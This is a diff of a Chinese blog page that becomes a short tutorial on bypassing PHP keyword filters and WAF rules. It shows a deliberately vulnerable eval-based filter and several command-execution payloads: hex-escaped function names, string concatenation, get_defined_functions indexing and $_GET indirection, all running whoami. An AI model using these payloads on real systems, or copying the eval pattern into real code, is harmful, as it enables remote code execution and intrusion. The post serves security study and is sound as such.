@@ -12,7 +12,7 @@
     
     
     
-    <title>404 | ruozhi</title>
+    <title>PHP 中绕过的小 TIPS | ruozhi</title>
     <link href=”https://liey1.github.io“ rel=”prefetch” />
 
     <link rel="stylesheet" href="/css/bootstrap.min.css">
@@ -180,10 +180,93 @@
         <div class="container">
             <div class="row">
                 <div class="col-md-8 gal-right" id="mainstay">
-                    <!-- 搜索页面(尽可能接近ZanBlog搜索功能) -->
+                    
+<article class="article well article-body" id="article">
+    <div class="breadcrumb">
+        <i class="fa fa-home"></i>
+        <a href="https://liey1.github.io">ruozhi</a>
+        >
+        <span>PHP 中绕过的小 TIPS</span>
+    </div>
+    <!-- 大型设备详细文章 -->
+    <div class="hidden-xs">
+        <div class="title-article">
+            <h1>
+                <a href="/2018/12/30/PHP 中绕过的小 TIPS/">PHP 中绕过的小 TIPS</a>
+            </h1>
+        </div>
+        <div class="tag-article">
+            
+            <span class="label label-gal">
+                <i class="fa fa-tags"></i>
+                
+                <a href="/tags/web/">web</a>, 
+                
+                <a href="/tags/php/">php</a>
+                
+            </span>
+            
+            <span class="label label-gal">
+                <i class="fa fa-calendar"></i> 2018-12-30
+            </span>
+            
+        </div>
+    </div>
+    <!-- 小型设备详细文章 -->
+    <div class="visible-xs">
+        <center>
+            <div class="title-article">
+                <h4>
+                    <a href="/2018/12/30/PHP 中绕过的小 TIPS/">PHP 中绕过的小 TIPS</a>
+                </h4>
+            </div>
+            <p>
+                <i class="fa fa-calendar"></i> 2018-12-30
+            </p>
+            <p>
+                
+                <i class="fa fa-tags"></i>
+                
+                <a href="/tags/web/">web</a>, 
+                
+                <a href="/tags/php/">php</a>
+                
+                
+                
+            </p>
+        </center>
+    </div>
+    <div class="content-article">
+        <p>来自一篇很有意思的文章：<a href="https://www.exploit-db.com/docs/46049" target="_blank" rel="noopener">How To Exploit PHP Remotely To Bypass Filters &amp; WAF Rules</a></p>
+<hr>
+<p>扫一下尘。。233</p>
+<p>首先来一段简易 WAF：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(preg_match(&quot;/system/i&quot;,$_GET[&apos;code&apos;]))&#123;</span><br><span class="line">    echo &quot;invalid syntax&quot;;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    eval($_GET[&apos;code&apos;]);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>当然我知道，还有别的方法执行命令，这里讨论如何绕过 <code>system</code>。</p>
+<p>我们知道（或许你刚刚才知道的），在 <code>php</code> 中可以这么表达一个字符串：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = &quot;\x61&quot;;</span><br><span class="line">$b = &quot;\141&quot;;</span><br><span class="line">$c = &quot;\u&#123;0061&#125;&quot;; // 这里个 &#123;&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>以上三个都能表示 <code>a</code> 这个字符。所以在这里我们可以这么绕过：<br><code>system = \x73\x79\x73\x74\x65\x6d</code>(<a href="https://tool.lu/hexstr/" target="_blank" rel="noopener">这里转</a>)</p>
+<p>于是我们就可以提交：<code>code = &quot;\x73\x79\x73\x74\x65\x6d&quot;(&#39;whoami&#39;)</code>;</p>
+<p>然后我们升级一下：<br><code>(preg_match(&quot;/system|\&quot;|&#39;/i&quot;,$_GET[&#39;code&#39;]))</code></p>
+<p>这次我们过滤了单双引号，我们上一个 payload 在这里就行不通了。</p>
+<p>但是我们又知道，在 PHP 中还可以这么表示字符串：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$a = (a);</span><br><span class="line">$b = (string)a;</span><br></pre></td></tr></table></figure></p>
+<p>当然，目前我们还是不能执行 <code>system</code>，我们可以用一下 <code>php</code> 中的字符串连接符（<code>.</code>）：</p>
+<p><code>(sy.(s).tem)</code></p>
+<p>于是我们的第一个 <code>payload</code> 诞生了：<br><code>(sy.(s).tem)(whoami);</code></p>
+<p>虽然会有一些报错，但好在还是执行了。。</p>
+<hr>
+<p>我们换个思路来玩玩：<code>get_defined_functions</code></p>
+<p>这个函数执行一下就知道了。会返回 <code>php</code> 中已经定义了得函数，包括内部的。自然，也有 <code>system</code>。</p>
+<p>这是个二维数组，内部函数在 <code>internal</code> 这个数组中。我执行了一下，<code>system</code> 在我这得下标是 <code>355</code>。于是第三个 <code>payload</code> 如下：</p>
+<p><code>(get_defined_functions()[internal][355])(whoami);</code></p>
+<p>当然还有个更简单的：</p>
+<p><code>?a=system&amp;code=$_GET[a](whoami);</code></p>
+<p>此外我们还可以利用类似：</p>
+<p><code>file_get_contents(substr(__FILE__,0,-19));</code> 然后再 <code>substr</code> 获取里面的内容来拼接。。这里的 <code>__FILE__</code> 会多出来一些字符，所以用 <code>substr</code> 截断一下。</p>
+<p>当然到这里我已经不知道有什么用了。。但觉得有意思就写下来了。。当作扫扫灰吧。。。</p>
 
-<!-- 404 自定义页面 -->
-<!-- 有其他想自定义的page在这里添加判断条件, 并且写好对应的模板渲染文件 -->
+    </div>
+</article>
+
 
                 </div>
                 <aside class="col-md-4 gal-left" id="sidebar">
@@ -299,10 +382,10 @@
             <ul class="nav nav-pills pills-gal">
                 
                 <li class="">
-                    <a href="/404/index.html#sidebar-friend-links" data-toggle="tab" id="friend-links-tab">我大哥的Blog</a>
+                    <a href="/2018/12/30/PHP 中绕过的小 TIPS/index.html#sidebar-friend-links" data-toggle="tab" id="friend-links-tab">我大哥的Blog</a>
                 </li>
                 <li class="">
-                    <a href="/404/index.html#sidebar-links" data-toggle="tab" id="links-tab">个人链接</a>
+                    <a href="/2018/12/30/PHP 中绕过的小 TIPS/index.html#sidebar-links" data-toggle="tab" id="links-tab">个人链接</a>
                 </li>
             </ul>
             <div class="tab-content">
